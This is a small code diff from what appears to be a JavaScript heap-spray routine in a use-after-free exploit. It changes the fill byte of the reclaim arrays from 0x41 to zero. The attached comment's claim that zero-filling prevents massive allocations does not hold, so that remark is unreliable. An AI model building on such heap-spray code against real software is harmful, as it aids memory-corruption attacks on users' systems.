@@ -129,7 +129,7 @@ function directOverlapSpray() {
         
         // Fill it with a recognizable pattern
         for(let j = 0; j < RECLAIM_SIZE; j++) {
-            arr[j] = 0x41; // 'A'
+            arr[j] = 0x00; // Zeroes instead of 'A' to prevent massive allocations
         }
         uaf_arrays.push(arr);
     }
